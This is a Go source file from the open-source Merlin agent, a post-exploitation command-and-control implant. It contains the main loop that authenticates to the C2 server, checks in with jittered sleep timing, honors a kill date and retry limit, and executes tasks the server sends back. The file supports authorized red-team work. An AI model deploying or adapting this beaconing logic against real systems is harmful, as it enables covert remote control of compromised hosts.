/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package run contains the logic for the Agent to execute operations checking for and sending messages
package run

import (
	// Standard
	"fmt"
	"math/rand"
	"os"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin-message"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/v2/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/cli"
	"github.com/Ne0nd0g/merlin-agent/v2/clients"
	"github.com/Ne0nd0g/merlin-agent/v2/core"
	as "github.com/Ne0nd0g/merlin-agent/v2/services/agent"
	"github.com/Ne0nd0g/merlin-agent/v2/services/client"
	"github.com/Ne0nd0g/merlin-agent/v2/services/message"
)

var agentService *as.Service
var clientService *client.Service
var messageService *message.Service

// Run instructs an agent to establish communications with the passed in server using the passed in client
func Run(a agent.Agent, c clients.Client) {
	// Set up the Agent service and add the Agent to the repository through the service
	agentService = as.NewAgentService()
	agentService.Add(a)

	// Set up the Client service and add the Client to the repository through the service
	clientService = client.NewClientService()
	clientService.Add(c)

	// Set up the Message service to handle Base messages
	messageService = message.NewMessageService(a.ID())

	cli.Message(cli.NOTE, fmt.Sprintf("Agent version: %s", core.Version))
	cli.Message(cli.NOTE, fmt.Sprintf("Agent build: %s", core.Build))

	for {
		a = agentService.Get()
		c = clientService.Get()
		// Verify the agent's kill date hasn't been exceeded
		if (a.KillDate() != 0) && (time.Now().Unix() >= a.KillDate()) {
			cli.Message(cli.WARN, fmt.Sprintf("agent kill date has been exceeded: %s, quitting...", time.Unix(a.KillDate(), 0).UTC().Format(time.RFC3339)))
			os.Exit(0)
		}
		// Check in
		if a.Authenticated() {
			// Synchronous clients will fill the console with this message because there is no sleep
			if a.Wait() >= 0 {
				cli.Message(cli.NOTE, "Checking in...")
			}
			checkIn()
		} else {
			err := clientService.Initial()
			if err != nil {
				agentService.IncrementFailed()
				a = agentService.Get()
				cli.Message(cli.WARN, err.Error())
				cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.Comms().Failed, a.Comms().Retry))
				if a.Wait() <= 0 {
					sleep := time.Second * 30
					cli.Message(cli.NOTE, fmt.Sprintf("Agent's sleep is %s, using error recovery default. Sleeping for %s at %s", a.Wait().String(), sleep.String(), time.Now().UTC().Format(time.RFC3339)))
					time.Sleep(sleep)
				}
			} else {
				cli.Message(cli.SUCCESS, "Agent authentication successful")
				agentService.SetAuthenticated(true)
				agentService.SetInitialCheckIn(time.Now().UTC())
				// If the Agent is synchronous, start a listener in a go routine to receive upstream messages anytime
				if c.Synchronous() {
					go listen()
				}
				// If the Agent doesn't sleep, start go routines that block waiting for a message to send back to the server
				if a.Wait() < 0 {
					go messageService.GetJobs()
					go messageService.GetDelegates()
				} else {
					// Used to immediately respond to AgentInfo request job from server
					checkIn()
				}
			}
		}
		// Get the latest copy of agent and client after incoming messages have been processed
		a = agentService.Get()
		c = clientService.Get()

		// Determine if the max number of failed checkins has been reached
		if a.Failed() >= a.MaxRetry() && a.MaxRetry() != 0 {
			cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d, quitting...", a.MaxRetry()))
			os.Exit(0)
		}
		if a.Wait() >= 0 {
			// Sleep
			var sleepTime time.Duration
			if a.Skew() > 0 {
				sleepTime = a.Wait() + (time.Duration(rand.Int63n(a.Skew())) * time.Millisecond) // #nosec G404 - Does not need to be cryptographically secure, deterministic is OK
			} else {
				sleepTime = a.Wait()
			}
			cli.Message(cli.NOTE, fmt.Sprintf("Sleeping for %s at %s", sleepTime.String(), time.Now().UTC().Format(time.RFC3339)))
			time.Sleep(sleepTime)
		}
	}
}

// checkIn is the function that agent runs at every sleep/skew interval to check in with the server for jobs
func checkIn() {
	cli.Message(cli.DEBUG, "run/run.checkIn(): entering into function...")
	defer cli.Message(cli.DEBUG, "run/run.checkIn(): leaving function...")
	a := agentService.Get()
	c := clientService.Get()
	var msg messages.Base
	if a.Wait() < 0 {
		// This call blocks until there is a message to return
		cli.Message(cli.NOTE, fmt.Sprintf("Waiting for a message to send upstream at %s", time.Now().UTC().Format(time.RFC3339)))
		msg = messageService.Get()
		cli.Message(cli.NOTE, fmt.Sprintf("Received message at %s", time.Now().UTC().Format(time.RFC3339)))
	} else {
		// This call DOES NOT block and will return a CheckIn message if there are no other messages in the queue
		msg = messageService.Check()
	}

	// Send the message to Merlin server or parent Agent
	bases, err := c.Send(msg)

	if err != nil {
		agentService.IncrementFailed()
		a := agentService.Get()
		cli.Message(cli.WARN, err.Error())
		// Determine if the max number of failed checkins has been reached
		if a.Failed() >= a.MaxRetry() && a.MaxRetry() != 0 {
			cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d, quitting...", a.MaxRetry()))
			os.Exit(0)
		} else {
			cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.Failed(), a.MaxRetry()))
		}

		// Put the jobs back into the queue if there was an error
		messageService.Store(msg)
		/*
			if msg.Type == messages.JOBS {
				err = messageService.Handle(msg)
				if err != nil {
					agentService.IncrementFailed()
				}
			}
		*/

		if a.Wait() <= 0 {
			sleep := time.Second * 30
			cli.Message(cli.NOTE, fmt.Sprintf("Agent's sleep is %s, using error recovery default. Sleeping for %s at %s", a.Wait().String(), sleep.String(), time.Now().UTC().Format(time.RFC3339)))
			time.Sleep(sleep)
		}
		return
	}

	agentService.SetFailedCheckIn(0)
	agentService.SetStatusCheckIn(time.Now().UTC())

	// Handle return messages from the Merlin server or the parent Agent
	for _, base := range bases {
		cli.Message(cli.DEBUG, fmt.Sprintf("Agent ID: %s", base.ID))
		cli.Message(cli.DEBUG, fmt.Sprintf("Message Type: %s", base.Type))
		cli.Message(cli.DEBUG, fmt.Sprintf("Message Payload: %+v", base.Payload))

		// Handle message
		err = messageService.Handle(base)
		if err != nil {
			agentService.IncrementFailed()
			// Determine if the max number of failed checkins has been reached
			a := agentService.Get()
			if a.Failed() >= a.MaxRetry() && a.MaxRetry() != 0 {
				cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d, quitting...", a.MaxRetry()))
				os.Exit(0)
			} else {
				cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.Failed(), a.MaxRetry()))
			}
		}
	}
}

// listen is an infinite loop used with synchronous Agents to receive Base messages and send them to the message handler
func listen() {
	var i int
	for {
		cli.Message(cli.DEBUG, fmt.Sprintf("run.listen(): entering into loop %d", i))
		i++
		msgs, err := clientService.Listen()
		if err != nil {
			agentService.IncrementFailed()
			a := agentService.Get()
			cli.Message(cli.WARN, fmt.Sprintf("run.listen(): there was an error listening: %s", err))
			// Determine if the max number of failed checkins has been reached
			if a.Failed() >= a.MaxRetry() && a.MaxRetry() != 0 {
				cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d, quitting...", a.MaxRetry()))
				os.Exit(0)
			} else {
				cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.Failed(), a.MaxRetry()))
			}
		} else {
			agentService.SetFailedCheckIn(0)
			if len(msgs) > 0 {
				for _, msg := range msgs {
					err = messageService.Handle(msg)
					if err != nil {
						cli.Message(cli.WARN, fmt.Sprintf("run.listen(): there was an error handling incoming messages: %s", err))
						agentService.IncrementFailed()
						// Determine if the max number of failed checkins has been reached
						a := agentService.Get()
						if a.Failed() >= a.MaxRetry() && a.MaxRetry() != 0 {
							cli.Message(cli.WARN, fmt.Sprintf("maximum number of failed checkin attempts reached: %d, quitting...", a.MaxRetry()))
							os.Exit(0)
						} else {
							cli.Message(cli.NOTE, fmt.Sprintf("%d out of %d total failed checkins", a.Failed(), a.MaxRetry()))
						}
					}
				}
			}
		}
	}
}
